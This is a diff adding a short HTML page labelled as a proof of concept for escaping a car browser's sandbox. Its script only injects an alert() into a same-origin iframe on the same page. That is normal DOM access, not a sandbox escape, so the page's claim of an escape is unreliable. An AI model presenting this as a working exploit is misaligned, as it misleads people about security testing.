@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Car Browser Sandbox Escape PoC</title>
+</head>
+<body>
+<h1>Car Browser Sandbox Escape PoC</h1>
+<p>Attempt to escape the browser sandbox.</p>
+
+<!-- Create an iframe element to try escaping the sandbox -->
+<iframe id="sandbox-escape-iframe"></iframe>
+
+<script>
+// Function to attempt sandbox escape
+function escapeSandbox() {
+    try {
+        // Access the contentWindow of the iframe to execute code
+        var iframe = document.getElementById('sandbox-escape-iframe');
+        var script = iframe.contentWindow.document.createElement('script');
+        script.text = 'alert("Sandbox Escaped iframe!");';
+        iframe.contentWindow.document.body.appendChild(script);
+    } catch (e) {
+        console.error('Sandbox escape failed:', e);
+    }
+}
+
+// Call the escapeSandbox function to attempt the escape
+escapeSandbox();
+</script>
+</body>
+</html>
